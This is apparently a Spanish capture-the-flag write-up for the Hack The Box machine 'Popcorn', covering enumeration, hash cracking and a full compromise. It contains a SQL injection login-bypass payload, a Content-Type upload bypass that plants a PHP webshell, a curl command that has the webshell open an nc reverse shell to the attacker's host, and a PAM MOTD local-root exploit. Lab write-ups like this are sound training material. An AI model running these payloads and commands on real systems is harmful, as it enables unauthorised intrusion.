---
tags:
title: Popcorn - Medium(HTB)
permalink: /Popcorn-HTB-Writeup
toc: true
toc_label:
toc_sticky: true
sidebar: main
---
---
# Introduccion

# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.255.7                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 21:49 EST
Nmap scan report for 10.129.255.7
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Did not follow redirect to http://popcorn.htb/
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.29 seconds
```

## Website 

![image-center](/assets/images/Pasted image 20251208235329.png)
## Feroxbuster enumeration

```bash
feroxbuster -u http://popcorn.htb
<SNIP>
200      GET        4l       25w      177c http://popcorn.htb/
200      GET        4l       25w      177c http://popcorn.htb/index
200      GET      656l     3113w    47444c http://popcorn.htb/test.php
200      GET      658l     3123w    47559c http://popcorn.htb/test

301      GET        9l       28w      312c http://popcorn.htb/torrent => http://popcorn.htb/torrent/
200      GET        1l       11w      183c http://popcorn.htb/torrent/logout
301      GET        9l       28w      316c http://popcorn.htb/torrent/css => http://popcorn.htb/torrent/css/
200      GET        6l       14w      321c http://popcorn.htb/torrent/stylesheet.css
200      GET       11l      135w      850c http://popcorn.htb/torrent/templates/about.php
302      GET        0l        0w        0c http://popcorn.htb/torrent/templates/modify.php => ../../index.php
200      GET       48l      352w     3690c http://popcorn.htb/torrent/templates/faq.php
200      GET        3l       15w      153c http://popcorn.htb/torrent/templates/torrents_list.php
200      GET        4l       15w      144c http://popcorn.htb/torrent/templates/news.php
200      GET        0l        0w        0c http://popcorn.htb/torrent/config
301      GET        9l       28w      316c http://popcorn.htb/torrent/lib => http://popcorn.htb/torrent/lib/
200      GET      104l      237w     2054c http://popcorn.htb/torrent/css/lightbox.css
200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/dblib.php
200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/webtorrent.php
200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/stdlib.php
200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/BEncode.php
200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/BDecode.php
200      GET        0l        0w        0c http://popcorn.htb/torrent/lib/getscrape.php
200      GET        7l       36w     1886c http://popcorn.htb/torrent/images/download.png
200      GET       13l       66w     4332c http://popcorn.htb/torrent/images/control%20panel.gif
200      GET        7l       39w     3737c http://popcorn.htb/torrent/images/login2.jpg
200      GET       10l       59w     4133c http://popcorn.htb/torrent/images/link-development.png
200      GET        5l       11w      440c http://popcorn.htb/torrent/images/button-bg.jpg
200      GET       12l       78w     5360c http://popcorn.htb/torrent/images/link-news.png
200      GET        2l       14w      674c http://popcorn.htb/torrent/images/page_bg.jpg
200      GET       13l       65w     5137c http://popcorn.htb/torrent/images/edit.jpg
200      GET        1l        1w       55c http://popcorn.htb/torrent/images/blank.gif
200      GET        7l       40w     2617c http://popcorn.htb/torrent/images/back.gif
200      GET       12l       47w     3408c http://popcorn.htb/torrent/images/news-arrow.gif
200      GET       11l       58w     4049c http://popcorn.htb/torrent/images/link-upload.png
200      GET        1l        5w       77c http://popcorn.htb/torrent/images/reg.gif
200      GET       11l       73w     5552c http://popcorn.htb/torrent/images/statics.jpg
200      GET        1l        6w       96c http://popcorn.htb/torrent/images/regb.gif
200      GET        8l       24w     2155c http://popcorn.htb/torrent/images/folder2.png
200      GET        4l       18w     1896c http://popcorn.htb/torrent/images/folder.png
200      GET        3l       13w     1627c http://popcorn.htb/torrent/images/details.png
200      GET       10l       25w     2538c http://popcorn.htb/torrent/images/search.jpg
200      GET        6l       34w     3691c http://popcorn.htb/torrent/images/download%20details.jpg
301      GET        9l       28w      319c http://popcorn.htb/torrent/upload => http://popcorn.htb/torrent/upload/
301      GET        9l       28w      321c http://popcorn.htb/torrent/database => http://popcorn.htb/torrent/database/
200      GET       26l       63w      968c http://popcorn.htb/torrent/rss
200      GET        2l        0w        4c http://popcorn.htb/torrent/secure
200      GET       24l       98w     3885c http://popcorn.htb/torrent/images/loading.gif
200      GET        8l       30w     2495c http://popcorn.htb/torrent/images/rightcor.png
200      GET       10l       51w     4166c http://popcorn.htb/torrent/images/link-home.png
200      GET        8l       48w     4023c http://popcorn.htb/torrent/images/link-browse.png
200      GET       66l      389w    34759c http://popcorn.htb/torrent/images/banner.jpg
200      GET       92l      609w    56889c http://popcorn.htb/torrent/images/button.png
301      GET        9l       28w      318c http://popcorn.htb/torrent/users => http://popcorn.htb/torrent/users/
200      GET      230l     1247w     9821c http://popcorn.htb/torrent/database/th_database.sql
200      GET       88l      634w    62088c http://popcorn.htb/torrent/images/register.png
301      GET        9l       28w      315c http://popcorn.htb/torrent/js => http://popcorn.htb/torrent/js/
200      GET       87l      652w    64417c http://popcorn.htb/torrent/images/mytorrents.png
200      GET       87l      629w    58643c http://popcorn.htb/torrent/images/login.png
200      GET       45l      266w     2152c http://popcorn.htb/torrent/js/scriptaculous.js
200      GET      118l      741w    60101c http://popcorn.htb/torrent/upload/noss.png
200      GET        0l        0w        0c http://popcorn.htb/torrent/download
200      GET      172l     1672w    95315c http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png
200      GET      689l     1962w    20711c http://popcorn.htb/torrent/js/lightbox.js
200      GET     1785l     4607w    47603c http://popcorn.htb/torrent/js/prototype.js
200      GET      903l     2738w    31969c http://popcorn.htb/torrent/js/effects.js
200      GET      293l      882w    11416c http://popcorn.htb/torrent/index
301      GET        9l       28w      322c http://popcorn.htb/torrent/templates => http://popcorn.htb/torrent/templates/
301      GET        9l       28w      318c http://popcorn.htb/torrent/admin => http://popcorn.htb/torrent/admin/
301      GET        9l       28w      319c http://popcorn.htb/torrent/images => http://popcorn.htb/torrent/images/
200      GET       16l       92w      936c http://popcorn.htb/torrent/comment
200      GET       37l       83w     1111c http://popcorn.htb/torrent/templates/torrents_list_date.php
200      GET       21l       52w      670c http://popcorn.htb/torrent/templates/subcategories.php
200      GET        2l       15w      143c http://popcorn.htb/torrent/templates/header.php
200      GET        2l       15w      153c http://popcorn.htb/torrent/templates/torrent_details.php
302      GET        0l        0w        0c http://popcorn.htb/torrent/templates/footer.php => http://popcorn.htb/index.php
200      GET      123l      315w     2599c http://popcorn.htb/torrent/templates/colours.css
200      GET        5l       28w      247c http://popcorn.htb/torrent/templates/directory.php
200      GET        6l       20w      120c http://popcorn.htb/torrent/templates/hack.php
200      GET        1l        0w        1c http://popcorn.htb/torrent/templates/form_header.php
200      GET      320l      669w     5205c http://popcorn.htb/torrent/templates/layout.css
200      GET       11l       39w      272c http://popcorn.htb/torrent/templates/email/reset_password.php
200      GET        4l       17w      161c http://popcorn.htb/torrent/templates/news2.php
200      GET        5l       13w       98c http://popcorn.htb/torrent/templates/insufficient_privileges.php
200      GET       24l       91w      964c http://popcorn.htb/torrent/templates/login_form.php
200      GET        2l       15w      143c http://popcorn.htb/torrent/templates/stats.php
200      GET       20l       79w      765c http://popcorn.htb/torrent/templates/report_form.php
200      GET        0l        0w        0c http://popcorn.htb/torrent/edit
200      GET      138l      809w    51153c http://popcorn.htb/torrent/preview
200      GET        1l        4w       81c http://popcorn.htb/torrent/users/index
301      GET        9l       28w      325c http://popcorn.htb/torrent/admin/images => http://popcorn.htb/torrent/admin/images/
301      GET        9l       28w      328c http://popcorn.htb/torrent/admin/templates => http://popcorn.htb/torrent/admin/templates/
200      GET        7l       29w     3224c http://popcorn.htb/torrent/admin/images/users.jpg
200      GET        1l        4w       81c http://popcorn.htb/torrent/admin/index.php
200      GET       16l       63w      542c http://popcorn.htb/torrent/admin/templates/comments_list.php
200      GET       13l       49w      417c http://popcorn.htb/torrent/admin/templates/hack_list.php
200      GET       15l      118w      779c http://popcorn.htb/torrent/admin/templates/admin.php
200      GET        2l       15w      149c http://popcorn.htb/torrent/admin/templates/header.php
200      GET       16l       51w      545c http://popcorn.htb/torrent/admin/templates/list_cat.php
200      GET       10l       32w      349c http://popcorn.htb/torrent/admin/templates/add_cat.php
200      GET       10l       32w      361c http://popcorn.htb/torrent/admin/templates/add_subcat.php
200      GET       13l       47w      414c http://popcorn.htb/torrent/admin/templates/ban_list.php
200      GET       30l      136w     1180c http://popcorn.htb/torrent/admin/templates/login_form2.php
200      GET        4l       33w     1775c http://popcorn.htb/torrent/admin/images/files%20management.gif
200      GET       13l       61w     5012c http://popcorn.htb/torrent/admin/images/users.png
200      GET        8l       35w     3745c http://popcorn.htb/torrent/admin/images/add%20news.jpg
200      GET       17l       55w     4152c http://popcorn.htb/torrent/admin/images/list%20torrents.jpg
200      GET      293l      882w    11416c http://popcorn.htb/torrent/index.php
200      GET      227l      489w     8418c http://popcorn.htb/torrent/login
200      GET        1l        4w       81c http://popcorn.htb/torrent/admin/users
200      GET        1l        4w       81c http://popcorn.htb/torrent/admin/index
200      GET        3l        5w      180c http://popcorn.htb/torrent/health/2.gif
200      GET        3l        4w      171c http://popcorn.htb/torrent/health/1.gif
200      GET      106l      206w     2988c http://popcorn.htb/torrent/admin/admin
200      GET       26l       63w      968c http://popcorn.htb/torrent/rss.php
200      GET      185l      476w     9322c http://popcorn.htb/torrent/browse
200      GET      237l      482w     8225c http://popcorn.htb/torrent/users/registration
301      GET        9l       28w      319c http://popcorn.htb/torrent/health => http://popcorn.htb/torrent/health/
200      GET        6l       14w      321c http://popcorn.htb/torrent/stylesheet
301      GET        9l       28w      321c http://popcorn.htb/torrent/torrents => http://popcorn.htb/torrent/torrents/
200      GET       11l       50w     3064c http://popcorn.htb/torrent/thumbnail
200      GET        0l        0w        0c http://popcorn.htb/torrent/torrents/index
200      GET      134l      306w     3767c http://popcorn.htb/torrent/hide
200      GET      215l      474w     7966c http://popcorn.htb/torrent/users/forgot_password
404      GET        9l       33w      304c http://popcorn.htb/torrent/torrents/Reports%20List
301      GET        9l       28w      319c http://popcorn.htb/torrent/readme => http://popcorn.htb/torrent/readme/
200      GET       63l     2053w    12333c http://popcorn.htb/torrent/readme/license.txt
200      GET       38l      246w     3412c http://popcorn.htb/torrent/readme/readme.html
301      GET        9l       28w      311c http://popcorn.htb/rename => http://popcorn.htb/rename/
200      GET        1l        4w       95c http://popcorn.htb/rename/index
200      GET        0l        0w        0c http://popcorn.htb/torrent/upload_file
200      GET        0l        0w        0c http://popcorn.htb/torrent/validator
200      GET        1l        4w       81c http://popcorn.htb/torrent/users/change_password


[####################] - 8m     30000/30000   65/s    http://popcorn.htb/ 
[##################>-] - 7m     28116/30000   64/s    http://popcorn.htb/torrent/ 
[####################] - 6s     30000/30000   4897/s  http://popcorn.htb/torrent/templates/ => Directory listing (add --scan-dir-listings to scan)
[##################>-] - 7m     28287/30000   65/s    http://popcorn.htb/torrent/admin/ 
[####################] - 8s     30000/30000   3708/s  http://popcorn.htb/torrent/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   30364/s http://popcorn.htb/torrent/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   41899/s http://popcorn.htb/torrent/lib/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   11986/s http://popcorn.htb/torrent/upload/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   21802/s http://popcorn.htb/torrent/database/ => Directory listing (add --scan-dir-listings to scan)
[##################>-] - 7m     27549/30000   63/s    http://popcorn.htb/torrent/users/ 
[####################] - 2s     30000/30000   16278/s http://popcorn.htb/torrent/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   42017/s http://popcorn.htb/torrent/templates/email/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4080/s  http://popcorn.htb/torrent/admin/templates/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4077/s  http://popcorn.htb/torrent/admin/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     30000/30000   4077/s  http://popcorn.htb/torrent/health/ => Directory listing (add --scan-dir-listings to scan)
[################>---] - 7m     25149/30000   61/s    http://popcorn.htb/torrent/torrents/ 
[####################] - 7s     30000/30000   4124/s  http://popcorn.htb/torrent/readme/ => Directory listing (add --scan-dir-listings to scan)
[############>-------] - 6m     19233/30000   58/s    http://popcorn.htb/rename/ 
[####################] - 7s     30000/30000   4077/s  http://popcorn.htb/torrent/PNG/ => Directory listing (add --scan-dir-listings to scan) 
```
### Database file

El escaneo me revela una ruta interesante con lo que parece ser una base de datos de `MySQL`, en la ruta `http://popcorn.htb/torrent/database/th_database.sql` 

![image-center](/assets/images/Pasted image 20251208235654.png)

```bash
hashcat -m 0 hash  /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting
<SNIP>

1844156d4166d94387f1a4ad031ca5fa:admin12                  
```
## Login page
### SQL Injection

![image-center](/assets/images/Pasted image 20251208235917.png)

Sin embargo son invalidas. Al intentar colocar una `'` me sale el siguiente error:

![image-center](/assets/images/Pasted image 20251209001241.png)

Ahora puedo probar una típica inyección para `bypassear` el login con el siguiente payload:

```bash
' or 1=1-- -
```

Y como se puede ver, pude lograrlo.
## File upload Bypass

![image-center](/assets/images/Pasted image 20251209001346.png)

Si clickeo en el siguiente Torrent `Kali Linux`, me sale la siguiente interfaz


![image-center](/assets/images/Pasted image 20251209003639.png)

Dentro del mismo puedo editar el Torrent, permitiéndome así subir, o mejor dicho actualizar la `screenshot`.
## Shell as www-data

![image-center](/assets/images/Pasted image 20251209135500.png)

Si intercepto la petición con `Burpsuite`, veo que me sale el error de `Invalid File`.

![image-center](/assets/images/Pasted image 20251209135613.png)

Para `bypassear` la validación que se realiza por detrás , probé usando dobles extensiones como por ejemplo : `cmd.php.jpeg`, pero me sigue saliendo el mismo error, por lo que quizás valide el `Content-Type` del propio archivo, por lo que lo cambie al de una imagen usando `iamge/jpeg`, y es así como pude subir mi `webshell`.

![image-center](/assets/images/Pasted image 20251209135543.png)

Ahora como el mismo archivo se sube y al no ser una imagen valida, sale el siguiente error.

![image-center](/assets/images/Pasted image 20251209135951.png)

Pero haciendo hovering, veo el siguiente enlace:

`http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php`

Que yendo al mismo veo que es mi shell, que al parecer se cargo con un nombre el cual parece estar hasheado.

![image-center](/assets/images/Pasted image 20251209003728.png)

Con `curl` probé la ejecución de comandos y me funciono.

```bash
curl -s -X GET "http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?cmd=whoami"
www-data
```

Por lo que ahora me envié una `shell` a mi maquina.

```bash
curl -s -X GET "http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?cmd=/bin/nc%2010.10.17.19%204444%20-e%20/bin/bash"
```

Y desde mi listener `nc` recibí la conexión como el usuario `www-data`.
```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.255.7] 60105
whoami
www-data
```

```bash
www-data@popcorn:/var/www/torrent$ cat /home/george/user.txt 
fe028d928352156bf2d667fde9f4c1d7
```
## Shell as root
### Enumeration

Dentro de la shell no vi nada interesante excepto una versión del sistema que esta muy desactualizado.

```bash
www-data@popcorn:/tmp# lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 9.10
Release:        9.10
Codename:       karmic
```
### Linux PAM
En este [Enlace](https://www.exploit-db.com/exploits/14339) hay un `PoC` el cual encontré buscando por algún exploit asociado a la versión `9.10`  de `Ubuntu`. Así que lo descargue en mi maquina para poder ejecutarlo y ganar así acceso como `root`.

```bash
www-data@popcorn:/tmp$ ./exploit.sh 
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: 
root@popcorn:/tmp# whoami
root
```

Dicho exploit abusa de los `Simlinks (Simbolic Links)`, de manera que cualquier usuario puede cambiar las propiedades de cualquier archivo del sistemas. Este en concreto afecta a versiones de `libpam-modules` anteriores a la `1.1.0-2ubuntu1.1 (Ubuntu 9.10)` y `1.1.1-2ubuntu5 (Ubuntu 10.04 LTS)`.
Para enumerar la versión del modulo se puede usar el siguiente comando.

```bash
www-data@popcorn:/tmp$ dpkg -l | grep libpam
ii  libpam-modules                      1.1.0-2ubuntu1                    Pluggable Authentication Modules for PAM
ii  libpam-runtime                      1.1.0-2ubuntu1                    Runtime support for the PAM library
ii  libpam0g                            1.1.0-2ubuntu1                    Pluggable Authentication Modules library
```

Y es asi otra de las maneras de identificar la version del modulo y el vector de ataque.

```bash
root@popcorn:/tmp# cat /root/root.txt 
adf555126a675d2ca9f84491d91b3d94
```

`~Happy Hacking.` 